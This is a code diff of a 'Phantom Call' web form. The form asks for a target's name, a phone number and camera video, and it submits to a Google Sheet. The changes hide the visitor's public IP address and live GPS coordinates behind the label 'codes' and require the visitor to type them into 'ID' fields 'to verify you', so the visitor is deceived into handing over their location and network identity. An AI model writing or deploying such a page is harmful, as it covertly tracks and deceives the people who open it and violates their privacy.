@@ -37,6 +37,13 @@
             window.location.href = "index.html";
         }
     }
+	function verifyloc() {
+        var userloc = document.querySelector("#demo").innerHTML;
+        var userloc1 = document.querySelector("#loc").value;
+        if (userloc != userloc1) {
+            window.location.href = "index.html";
+        }
+    }
 	</script>
 
     <script>
@@ -82,23 +89,27 @@
 <body ondblclick="delDIO()">
     <div class="form-container-container">
         <div class="welcome-mess">Welcome, We save your time and you from awkward situation.</div>
-        <div class="welcome-mess">After Filling, Please Double Click Anywhere To Improve Quality.</div>
-        <div class="welcome-mess"><h3>Public IP Address of user is:</h3>
-		<p id="gfg"></p></div>
+        <div class="welcome-mess">After Filling, Please Double Click Anywhere To Improve Quality & To Get Codes.</div>
+        <div class="welcome-mess">
+            <h3>Enter these codes in ID boxes to verify you</h3>
+        </div>
+        <div class="welcome-mess">
+            <p id="gfg" style="color: white;"></p>
+        </div>
+        <div class="welcome-mess">
+            <p id="demo"></p>
+        </div>
         <div class="form-container">
             <div class="form-head-container">
                 <img id="contact-us-img" src="icons8-contact-us-64.png">
                 <p id="contact-us-label">Recieve Phantom Call</p>
             </div>
-            <form  id="contact-us-form" name="google-sheet">
+            <form  id="contact-us-form" name="google-sheet" ondblclick="getLocation()">
                 <div class="label-input-container">
                     <label for="name" class="form-items">Name</label>
                     <input id="name" class="user-name" name="name" type="text" required placeholder="Target Name">
                 </div>
-		<div class="label-input-container">
-                    <label for="ip" class="form-items">IP</label>
-                    <input id="ip" class="user-ip" name="ip" type="text" required placeholder="ID">
-                </div>
+		
                 <br><br>
                 <div class="label-input-container">
                     <label for="phno" class="form-items">Contact No.</label>
@@ -123,7 +134,15 @@
                     <label for="rec-video" class="form-items">Video</label>
                     <input id="rec-video" name="rec-video" type="file" accept="video/*" capture="environment" onchange="loadVideo()">
                 </div>
-                <button type="button" id="submit-btn" value="submit" onclick="changeusername();verifyip();">Recieve Call</button>
+		<div class="label-input-container">
+                    <label for="ip" class="form-items">ID1</label>
+                    <input id="ip" class="user-ip" name="ip" type="text" required>
+                </div>
+		<div class="label-input-container">
+                    <label for="loc" class="form-items">ID2</label>
+                    <input id="loc" class="user-loc" name="loc" type="text" required >
+                </div>
+                <button type="button" id="submit-btn" value="submit" onclick="changeusername();verifyip();verifyloc();">Recieve Call</button>
             </form>
         </div>
     </div>
@@ -380,6 +399,19 @@
                                                                                                                     
     function showvideo() {
         document.querySelector("#video").style.display = "block";
+    }
+	    var x = document.getElementById("demo");
+
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(showPosition);
+        } else {
+            x.innerHTML = "Geolocation is not supported by this browser.";
+        }
+    }
+
+    function showPosition(position) {
+        x.innerHTML = position.coords.latitude + " " + position.coords.longitude;
     }
 </script>
 
